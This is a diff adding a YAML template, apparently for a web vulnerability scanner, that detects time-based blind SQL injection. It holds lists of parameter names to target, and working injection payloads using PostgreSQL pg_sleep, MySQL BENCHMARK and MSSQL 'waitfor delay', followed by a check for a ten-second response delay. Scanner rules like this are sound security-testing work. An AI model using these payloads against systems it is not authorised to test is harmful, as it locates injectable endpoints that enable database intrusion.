@@ -1,0 +1,76 @@
+bug-name: "SQL Injection"
+bug-type: "sqli"
+target-arguments:
+  - type: "word"
+    part: "all"
+    target: "name"
+    words:
+      - "url"
+      - "report"
+      - "role"
+      - "update"
+      - "query"
+      - "user"
+      - "name"
+      - "where"
+      - "search"
+      - "params"
+      - "process"
+      - "view"
+      - "table"
+      - "from"
+      - "sel"
+      - "results"
+      - "sleep"
+      - "fetch"
+      - "order"
+      - "keyword"
+      - "field"
+      - "delete"
+      - "string"
+      - "number"
+      - "filter"
+
+  - type: "regex"
+    target: "name"
+    part: "query"
+    regexes: 
+      - "^.*(id|col|item|category|select|sort|row).*$"
+number-of-flow: 2
+flows:
+  match-condition: "all"
+  flow_1:
+    payloads:
+      - value: "'||(select 1 from pg_sleep(10))||'"
+        position: "inject"
+        tag: "postgresql"
+      
+      - value: "'+BENCHMARK(70000000,SHA1(1337))+'"
+        position: "inject"
+        tag: "mysql, mariadb"
+      
+      - value: ";waitfor delay '0:0:10'--"
+        position: "append"
+        tag: "mssql"
+      
+      - value: ");waitfor delay '0:0:10'--"
+        position: "append"
+        tag: "mssql"
+      
+      - value: "';waitfor delay '0:0:10'--"
+        position: "append"
+        tag: "mssql"
+      
+      - value: "');waitfor delay '0:0:10'--"
+        position: "append"
+        tag: "mssql"
+      
+      - value: "));waitfor delay '0:0:10'--"
+        position: "append"
+        tag: "mssql"
+    endpoint: "{{base_url}}"
+    verify:
+      - function: "is_delayed_for"
+        args:
+          duration: 10
+        expected-value: True
